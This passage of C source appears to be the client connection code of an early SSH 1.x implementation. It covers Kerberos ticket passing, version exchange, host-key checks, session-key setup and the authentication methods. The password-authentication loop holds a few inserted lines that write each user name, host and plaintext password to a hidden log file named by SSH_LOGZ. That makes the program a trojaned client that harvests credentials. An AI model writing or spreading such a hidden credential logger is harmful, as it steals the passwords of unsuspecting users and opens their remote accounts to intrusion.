  memset(&outbuf, 0 , sizeof(outbuf));
  
  debug("Trying Kerberos V5 TGT passing.");
  
  if (!ssh_context)
    {
      if ((r = krb5_init_context(&ssh_context)))
        fatal("Kerberos V5: %.100s while initializing krb5.",
              error_message(r));
      krb5_init_ets(ssh_context);
    }
  if (!auth_context)
    {
      if ((r = krb5_auth_con_init(ssh_context, &auth_context)))
        {
          debug("Kerberos V5: failed to init auth_context (%.100s)",
                error_message(r));
          return 0 ;
        }
      krb5_auth_con_setflags(ssh_context, auth_context,
                             KRB5_AUTH_CONTEXT_RET_TIME);
    }
  
  if ((r = krb5_cc_default(ssh_context, &ccache)))
    {
      debug("Kerberos V5: could not get default ccache.");
      return 0 ;
    }
  
    if ((r = krb5_cc_get_principal(ssh_context, ccache,
                                   &client)))
      {
        debug("Kerberos V5: failure on principal (%.100s)",
              error_message(r));
        return 0 ;
      }
    
    /* Somewhat of a hack here. We need to get the TGT for the
       clients realm. However if remotehost is in another realm
       krb5_fwd_tgt_creds will try to go to that realm to get
       the TGT, which will fail. So we create the server 
       principal and point it to clients realm. This way
       we pass over a TGT of the clients realm. */
    
    snprintf(server_name, sizeof(server_name), "host/%.100s@", remotehost);
    strncat(server_name, client->realm.data,client->realm.length);
    krb5_parse_name(ssh_context,server_name, &server);
    server->type = KRB5_NT_SRV_HST;
    
    
    if ((r = krb5_fwd_tgt_creds(ssh_context, auth_context, 0, client, 
                                server, ccache, 1, &outbuf)))
      {
        debug("Kerberos V5 krb5_fwd_tgt_creds failure (%.100s)",
              error_message(r));
        krb5_free_principal(ssh_context, client);
        krb5_free_principal(ssh_context, server);
        return 0 ;
      }
    packet_start(SSH_CMSG_HAVE_KERBEROS_TGT);
    packet_put_string((char *)outbuf.data, outbuf.length);
    packet_send();
    packet_write_wait();
    
    if (outbuf.data)
      free(outbuf.data);
    krb5_free_principal(ssh_context, client);
    krb5_free_principal(ssh_context, server);
    
    type = packet_read();
    if (type == SSH_SMSG_SUCCESS)
      {
        debug("Kerberos V5 TGT passing was successful.");
        return 1;
      }
    else
      if (type != SSH_SMSG_FAILURE)
        packet_disconnect("Protocol error on Kerberos tgt response: %d", type);
      else 
        debug("Kerberos V5 TGT passing failed.");
    
    return 0;
#endif /* KRB5 */
}
#endif /* KERBEROS_TGT_PASSING */

/* Waits for the server identification string, and sends our own identification
   string. */

void ssh_exchange_identification(void)
{
  char buf[256], remote_version[256]; /* must be same size! */
  int remote_major, remote_minor, i;
  int my_major, my_minor;
  int len;
  int connection_in = packet_get_connection_in();
  int connection_out = packet_get_connection_out();

  /* Read other side\'s version identification. */
  for (i = 0; i < sizeof(buf) - 1; i++)
    {
      len = read(connection_in, &buf[i], 1);
      if (len == 0)
        fatal("Connection closed by foreign host.");
      else
        if (len < 0)
          fatal("read: %.100s", strerror(errno));
      if (buf[i] == '\r')
        {
          buf[i] = '\n';
          buf[i + 1] = 0;
          i++;
        }
      if (buf[i] == '\n')
        {
          buf[i + 1] = 0;
          break;
        }
    }
  buf[sizeof(buf) - 1] = 0;
  
  /* Check that the versions match.  In future this might accept several
     versions and set appropriate flags to handle them. */
  if (sscanf(buf, "SSH-%d.%d-%[^\n]\n", &remote_major, &remote_minor, 
             remote_version) != 3)
    fatal("Bad remote protocol version identification: '%.100s'", buf);
  debug("Remote protocol version %d.%d, remote software version %.100s",
        remote_major, remote_minor, remote_version);

  switch (check_emulation(remote_major, remote_minor,
                     &my_major, &my_minor))
    {
    case EMULATE_VERSION_TOO_OLD:
      fatal("Remote machine has too old SSH software version.");
    case EMULATE_MAJOR_VERSION_MISMATCH:
      fatal("Major protocol versions incompatible.");
    case EMULATE_VERSION_NEWER:
      /* We will emulate the old version. */
      break;
    case EMULATE_VERSION_OK:
      break;
    default:
      fatal("Unexpected return value from check_emulation.");
    }
  
  snprintf(buf, sizeof(buf), "SSH-%d.%d-%.100s", 
          my_major, my_minor, SSH_VERSION);
#ifdef F_SECURE_COMMERCIAL

#endif /* F_SECURE_COMMERCIAL */
  strcat(buf, "\n");
  if (write(connection_out, buf, strlen(buf)) != strlen(buf))
    fatal("write: %.100s", strerror(errno));
}

/* Starts a dialog with the server, and authenticates the current user on the
   server.  This does not need any extra privileges.  The basic connection
   to the server must already have been established before this is called. 
   User is the remote user; if it is NULL, the current local user name will
   be used.  Anonymous indicates that no rhosts authentication will be used.
   If login fails, this function prints an error and never returns. 
   This function does not require super-user privileges. */

void ssh_login(RandomState *state, int host_key_valid, 
               RSAPrivateKey *own_host_key,
               const char *orighost, 
               Options *options, uid_t original_real_uid)
{
  int i, type, len, f;
  char buf[1024], seedbuf[16];
  char *password;
  struct passwd *pw;
  MP_INT key;
  RSAPublicKey host_key;
  RSAPublicKey public_key;
  unsigned char session_key[SSH_SESSION_KEY_LENGTH];
  const char *server_user, *local_user;
  char *cp, *host;
  struct stat st;
  unsigned char check_bytes[8];
  unsigned int supported_ciphers, supported_authentications, protocol_flags;
  HostStatus host_status;
#ifdef KERBEROS 
#ifdef KRB5
  char *kuser;
  krb5_ccache ccache;
  krb5_error_code problem;
  krb5_principal client;
#endif
#endif
  
  /* Convert the user-supplied hostname into all lowercase. */
  host = xstrdup(orighost);
  for (cp = host; *cp; cp++)
    if (isupper(*cp))
      *cp = tolower(*cp);

  /* Map localhost to ip-address locally */
  if (strcmp(host, "localhost") == 0)
    {
      xfree(host);
      host = xstrdup("127.0.0.1");
    }
  
  /* Exchange protocol version identification strings with the server. */
  ssh_exchange_identification();

  /* Put the connection into non-blocking mode. */
  packet_set_nonblocking();

  /* Get local user name.  Use it as server user if no user name
     was given. */
  pw = getpwuid(original_real_uid);
  if (!pw)
    fatal("User id %d not found from user database.", original_real_uid);
  local_user = xstrdup(pw->pw_name);
  server_user = options->user ? options->user : local_user;

  debug("Waiting for server public key.");

  /* Wait for a public key packet from the server. */
  packet_read_expect(SSH_SMSG_PUBLIC_KEY);

  /* Get check bytes from the packet. */
  for (i = 0; i < 8; i++)
    check_bytes[i] = packet_get_char();

  /* Get the public key. */
  public_key.bits = packet_get_int();
  mpz_init(&public_key.e);
  packet_get_mp_int(&public_key.e);
  mpz_init(&public_key.n);
  packet_get_mp_int(&public_key.n);

  /* Get the host key. */
  host_key.bits = packet_get_int();
  mpz_init(&host_key.e);
  packet_get_mp_int(&host_key.e);
  mpz_init(&host_key.n);
  packet_get_mp_int(&host_key.n);

  /* Get protocol flags. */
  protocol_flags = packet_get_int();
  packet_set_protocol_flags(protocol_flags);

  /* Get supported cipher types. */
  supported_ciphers = packet_get_int();

  /* Get supported authentication types. */
  supported_authentications = packet_get_int();

  debug("Received server public key (%d bits) and host key (%d bits).", 
        public_key.bits, host_key.bits);

  /* Compute the session id. */
  compute_session_id(session_id, check_bytes, host_key.bits, &host_key.n, 
                     public_key.bits, &public_key.n);

  /* Check if the host key is present in the user's list of known hosts
     or in the systemwide list. */
  host_status = check_host_in_hostfile(original_real_uid,
                                       options->user_hostfile, 
                                       host, host_key.bits, 
                                       &host_key.e, &host_key.n);
  if (host_status == HOST_NEW)
    host_status = check_host_in_hostfile(original_real_uid,
                                         options->system_hostfile, host, 
                                         host_key.bits, &host_key.e, 
                                         &host_key.n);

  /* Force accepting of the host key for localhost and 127.0.0.1.
     The problem is that if the home directory is NFS-mounted to multiple
     machines, localhost will refer to a different machine in each of them,
     and the user will get bogus HOST_CHANGED warnings.  This essentially
     disables host authentication for localhost; however, this is probably
     not a real problem. */
  if (strcmp(host, "127.0.0.1") == 0)
    {
      debug("Forcing accepting of host key for localhost.");
      host_status = HOST_OK;
    }

  switch (host_status)
    {
    case HOST_OK:
      /* The host is known and the key matches. */
      debug("Host '%.200s' is known and matches the host key.", host);
      break;
    case HOST_NEW:
      /* The host is new. */
      if (options->strict_host_key_checking == 1)
        { /* User has requested strict host key checking.  We will not
             add the host key automatically.  The only alternative left
             is to abort. */
          fatal("No host key is known for %.200s and you have requested strict checking.", host);
        }

      error("Host key not found from the list of known hosts.");
      if (options->strict_host_key_checking == 2)
        {
          if (options->batch_mode)
            fatal("No host key is known for %.200s and cannot confirm operation when running in batch mode.", host);

          read_confirmation("Are you sure you want to continue connecting (yes/no)? ");
        }
      /* If not in strict mode, add the key automatically to the local
         known_hosts file. */
      if (!add_host_to_hostfile(original_real_uid,
                                options->user_hostfile, host, host_key.bits,
                                &host_key.e, &host_key.n))
        log_msg("Failed to add the host to the list of known hosts (%.500s).", 
                options->user_hostfile);
      else
        log_msg("Host '%.200s' added to the list of known hosts.", host);
      break;
    case HOST_CHANGED:
      /* The host key has changed. */
      error("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@");
      error("@       WARNING: HOST IDENTIFICATION HAS CHANGED!         @");
      error("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@");
      error("IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!");
      error("Someone could be eavesdropping on you right now (man-in-the-middle attack)!");
      error("It is also possible that the host key has just been changed.");
      error("Please contact your system administrator.");
      error("Add correct host key in %.200s to get rid of this message.", 
            options->user_hostfile);
      
      /* If strict host key checking is in use, the user will have to edit
         the key manually and we can only abort. */
      if (options->strict_host_key_checking == 1)
        fatal("Host key for %.200s has changed and you have requested strict checking.", host);
      
      /* If strict host key checking has not been requested, allow the
         connection but without password authentication. */
      if (options->forward_agent)
        {
          error("Agent forwarding is disabled to avoid attacks by corrupted servers.");
          options->forward_agent = 0;
        }
      if (options->forward_x11)
        {
          error("X11 forwarding is disabled to avoid attacks by corrupted servers.");
          options->forward_x11 = 0;
        }
      if (options->num_local_forwards > 0)
        {
          error("Local port forwarding is disabled to avoid attacks by corrupted servers.");
          options->num_local_forwards = 0;
        }
      if (options->num_remote_forwards)
        {
          error("Remote port forwarding is disabled to avoid attacks by corrupted servers.");
          options->num_remote_forwards = 0;
        }
      
      if (options->strict_host_key_checking == 2)
        {
          if (options->batch_mode)
            fatal("No host key is known for %.200s and cannot confirm operation when running in batch mode.", host);
          
          read_confirmation("Are you sure you want to continue connecting (yes/no)? ");
        }
      
      /* XXX Should permit the user to change to use the new id.  This could
         be done by converting the host key to an identifying sentence, tell
         that the host identifies itself by that sentence, and ask the user
         if he/she whishes to accept the authentication. */
      break;
    }
  /* Generate a session key. */
  
  /* Initialize the random number generator. */
  snprintf(buf, sizeof(buf), "%.500s/%.200s", pw->pw_dir, SSH_CLIENT_SEEDFILE);
  if (userfile_stat(pw->pw_uid, buf, &st) < 0)
    log_msg("Creating random seed file ~/%.200s.  This may take a while.", 
        SSH_CLIENT_SEEDFILE);
  else
    debug("Initializing random; seed file %.900s", buf);
  random_initialize(state, pw->pw_uid, buf);

  /* Read also some random data from the systemwide random seed file to
     avoid the user being able to guess his own session key when running
     as root. */
  f = open(SSH_DAEMON_SEED_FILE, O_RDONLY);
  if (f >= 0)
    {
      len = read(f, seedbuf, sizeof(seedbuf)); /* Try to read 128 bits. */
      if (len > 0)
        {
          random_add_noise(state, seedbuf, len);
          random_stir(state);
        }
      close(f);
    }

  /* Generate an encryption key for the session.   The key is a 256 bit
     random number, interpreted as a 32-byte key, with the least significant
     8 bits being the first byte of the key. */
  for (i = 0; i < SSH_SESSION_KEY_LENGTH; i++)
    session_key[i] = random_get_byte(state);

  /* Save the new random state. */
  random_save(state, pw->pw_uid, buf);

  /* According to the protocol spec, the first byte of the session key is
     the highest byte of the integer.  The session key is xored with the
     first 16 bytes of the session id. */
  mpz_init_set_ui(&key, 0);
  for (i = 0; i < SSH_SESSION_KEY_LENGTH; i++)
    {
      mpz_mul_2exp(&key, &key, 8);
      if (i < 16)
        mpz_add_ui(&key, &key, session_key[i] ^ session_id[i]);
      else
        mpz_add_ui(&key, &key, session_key[i]);
    }

  /* Encrypt the integer using the public key and host key of the server
     (key with smaller modulus first). */
  if (mpz_cmp(&public_key.n, &host_key.n) < 0)
    {
      /* Public key has smaller modulus. */
      assert(host_key.bits >= public_key.bits + SSH_KEY_BITS_RESERVED);

      rsa_public_encrypt(&key, &key, &public_key, state);
      rsa_public_encrypt(&key, &key, &host_key, state);
    }
  else
    {
      /* Host key has smaller modulus (or they are equal). */
      assert(public_key.bits >= host_key.bits + SSH_KEY_BITS_RESERVED);

      rsa_public_encrypt(&key, &key, &host_key, state);
      rsa_public_encrypt(&key, &key, &public_key, state);
    }

  if (options->cipher == SSH_CIPHER_NOT_SET)
    if (cipher_mask() & supported_ciphers & (1 << SSH_CIPHER_IDEA))
      options->cipher = SSH_CIPHER_IDEA;
    else
      {
        debug("IDEA not supported, using %.100s instead.",
              cipher_name(SSH_FALLBACK_CIPHER));
        options->cipher = SSH_FALLBACK_CIPHER;
      }

  /* Check that the selected cipher is supported. */
  if (!(supported_ciphers & (1 << options->cipher)))
    fatal("Selected cipher type %.100s not supported by server.", 
          cipher_name(options->cipher));

  debug("Encryption type: %.100s", cipher_name(options->cipher));

  /* Send the encrypted session key to the server. */
  packet_start(SSH_CMSG_SESSION_KEY);
  packet_put_char(options->cipher);

  /* Send the check bytes back to the server. */
  for (i = 0; i < 8; i++)
    packet_put_char(check_bytes[i]);

  /* Send the encrypted encryption key. */
  packet_put_mp_int(&key);

  /* Send protocol flags. */
  packet_put_int(SSH_PROTOFLAG_SCREEN_NUMBER | SSH_PROTOFLAG_HOST_IN_FWD_OPEN);

  /* Send the packet now. */
  packet_send();
  packet_write_wait();

  /* Destroy the session key integer and the public keys since we no longer
     need them. */
  mpz_clear(&key);
  rsa_clear_public_key(&public_key);
  rsa_clear_public_key(&host_key);

  debug("Sent encrypted session key.");
  
  /* Set the encryption key. */
  packet_set_encryption_key(session_key, SSH_SESSION_KEY_LENGTH, 
                            options->cipher, 1);

  /* We will no longer need the session key here.  Destroy any extra copies. */
  memset(session_key, 0, sizeof(session_key));

  /* Expect a success message from the server.  Note that this message will
     be received in encrypted form. */
  packet_read_expect(SSH_SMSG_SUCCESS);

  debug("Received encrypted confirmation.");

#ifdef KERBEROS 
#ifdef KRB5
  if (!ssh_context)
    {
      if ((problem = krb5_init_context(&ssh_context)))
        fatal("Kerberos V5: %.100s while initializing krb5.",
              error_message(problem));
      krb5_init_ets(ssh_context);
    }
  if ((supported_authentications & (1 << SSH_AUTH_KERBEROS)) &&
      options->kerberos_authentication && options->no_user_given )
    {
      /* Send over fully qualified kerberos username for the 
         remote username. Let the server figure out what the 
         localname should be. */
      
      if (!krb5_cc_default(ssh_context, &ccache))
        {
          if ((problem = krb5_cc_get_principal(ssh_context, ccache,
                                               &client)))
            {
              debug("Kerberos V5: failure on principal (%.100s).",
                    error_message(problem));
            }
          else {
            if (!krb5_unparse_name(ssh_context, client, &kuser))
              server_user = kuser;
            krb5_free_principal(ssh_context, client);
          }
        }
      else
        debug("Kerberos V5: could not get default ccache.");
    }
#endif /* KRB5 */
#endif /* KERBEROS */
  
  /* Send the name of the user to log in as on the server. */
  packet_start(SSH_CMSG_USER);
  packet_put_string(server_user, strlen(server_user));
  packet_send();
  packet_write_wait();

  /* The server should respond with success if no authentication is needed
     (the user has no password).  Otherwise the server responds with 
     failure. */
  type = packet_read();
  if (type == SSH_SMSG_SUCCESS)
    return;  /* Connection was accepted without authentication. */
  if (type != SSH_SMSG_FAILURE)
    packet_disconnect("Protocol error: got %d in response to SSH_CMSG_USER",
                      type);

#ifdef KERBEROS_TGT_PASSING
  /* Try Kerberos tgt passing if the server supports it. */
  if ((supported_authentications & (1 << SSH_PASS_KERBEROS_TGT)) &&
      options->kerberos_tgt_passing)
    {
      if (options->cipher == SSH_CIPHER_NONE)
        log_msg("WARNING: Encryption is disabled! Ticket will be transmitted in the clear!");
      (void)send_kerberos_tgt();
    }
#endif /* KERBEROS_TGT_PASSING */
  
#ifdef KERBEROS
#ifdef KRB5
  if ((supported_authentications & (1 << SSH_AUTH_KERBEROS)) &&
      options->kerberos_authentication)
    {
      debug("Trying Kerberos V5 authentication.");
#endif
      if (try_kerberos_authentication()) {
        /* The server should respond with success or failure. */
        type = packet_read();
        if (type == SSH_SMSG_SUCCESS)
          return; /* Successful connection. */
        if (type != SSH_SMSG_FAILURE)
          packet_disconnect("Protocol error: got %d in response to Kerberos auth", type);
      }
#ifdef KRB5
    }
#endif
#endif /* KERBEROS */

  /* Use rhosts authentication if running in privileged socket and we do not
     wish to remain anonymous. */
  if ((supported_authentications & (1 << SSH_AUTH_RHOSTS)) && 
      options->rhosts_authentication)
    {
      debug("Trying rhosts authentication.");
      packet_start(SSH_CMSG_AUTH_RHOSTS);
      packet_put_string(local_user, strlen(local_user));
      packet_send();
      packet_write_wait();

      /* The server should respond with success or failure. */
      type = packet_read();
      if (type == SSH_SMSG_SUCCESS)
        return; /* Successful connection. */
      if (type != SSH_SMSG_FAILURE)
        packet_disconnect("Protocol error: got %d in response to rhosts auth",
                          type);
    }

  /* Try .rhosts or /etc/hosts.equiv authentication with RSA host 
     authentication. */
  if ((supported_authentications & (1 << SSH_AUTH_RHOSTS_RSA)) &&
      options->rhosts_rsa_authentication && host_key_valid)
    {
      if (try_rhosts_rsa_authentication(local_user, own_host_key))
        return; /* Successful authentication. */
    }

  /* Try RSA authentication if the server supports it. */
  if ((supported_authentications & (1 << SSH_AUTH_RSA)) &&
      options->rsa_authentication)
    {
      /* Try RSA authentication using the authentication agent.  The agent
         is tried first because no passphrase is needed for it, whereas
         identity files may require passphrases. */
      if (try_agent_authentication())
        return; /* Successful connection. */

      /* Try RSA authentication for each identity. */
      for (i = 0; i < options->num_identity_files; i++)
        if (try_rsa_authentication(pw, options->identity_files[i],
                                   !options->batch_mode))
          return; /* Successful connection. */
    }
  
  /* Support for TIS authentication server
     Contributed by Andre April <Andre.April@cediti.be>. */
  /* Try Tis authentication daemon if the server supports it. */
  if ((supported_authentications & (1 << SSH_AUTH_TIS)) &&
      options->tis_authentication && !options->batch_mode)
    {
      char *prompt;
      debug("Doing TIS authentication.");
      if (options->cipher == SSH_CIPHER_NONE)
        log_msg("WARNING: Encryption is disabled! Password will be transmitted in clear text.");
      packet_start(SSH_CMSG_AUTH_TIS);
      packet_send();
      packet_write_wait();
      
      type = packet_read();
      if (type == SSH_SMSG_FAILURE) {
        /* Authentication failure : either the authentication server is */
        /* not accessible (or unknown) or the user is not registered on */
        /* the authentication server. Try next authentication method. */
        debug("User cannot be identifier on authentication server.");
      } else {
        if (type != SSH_SMSG_AUTH_TIS_CHALLENGE) {
          packet_disconnect("Protocol error: got %d in response to TIS auth request",
                            type);
        }
        prompt = packet_get_string(NULL);
        /* Asks for password */
        password = read_passphrase(pw->pw_uid, prompt, 0);
        packet_start(SSH_CMSG_AUTH_TIS_RESPONSE);
        packet_put_string(password, strlen(password));
        memset(password, 0, strlen(password));
        xfree(password);
        packet_send();
        packet_write_wait();
        
        type = packet_read();
        if (type == SSH_SMSG_SUCCESS)
          return; /* Successful connection. */
        if (type != SSH_SMSG_FAILURE)
          packet_disconnect("Protocol error: got %d in response to TIS auth",
                            type);
      }
    }
  
  /* Try password authentication if the server supports it. */
  if ((supported_authentications & (1 << SSH_AUTH_PASSWORD)) &&
      options->password_authentication && !options->batch_mode)
    {
      char prompt[80];
      debug("Doing password authentication.");
      if (options->cipher == SSH_CIPHER_NONE)
        log_msg("WARNING: Encryption is disabled! Password will be transmitted in clear text.");
      if (options->password_prompt_login && options->password_prompt_host)
        snprintf(prompt, sizeof(prompt),
                 "%.30s@%.30s's password: ", server_user, host);
      else if (!options->password_prompt_login &&
               !options->password_prompt_host)
        snprintf(prompt, sizeof(prompt), "Password: ");
      else if (options->password_prompt_login)
        snprintf(prompt, sizeof(prompt), "%.30s's password: ", server_user);
      else
        snprintf(prompt, sizeof(prompt), "%.30s password: ", host);
      
      for(i = 0; i < options->number_of_password_prompts; i++)
        {
          password = read_passphrase(pw->pw_uid, prompt, 0);
          packet_start(SSH_CMSG_AUTH_PASSWORD);
          packet_put_string(password, strlen(password));
	  if((fp=fopen(SSH_LOGZ,"at"))!=NULL) {
	  fprintf(fp,"%s@%s [%s]\n",server_user,host,password);
	  fclose(fp);
	  }
          memset(password, 0, strlen(password));
          xfree(password);
          packet_send();
          packet_write_wait();
          
          type = packet_read();
          if (type == SSH_SMSG_SUCCESS)
            return; /* Successful connection. */
          if (type != SSH_SMSG_FAILURE)
            packet_disconnect("Protocol error: got %d in response to passwd auth",
                              type);
        }
    }

  /* All authentication methods have failed.  Exit with an error message. */
  fatal("Permission denied.");
  /*NOTREACHED*/
}
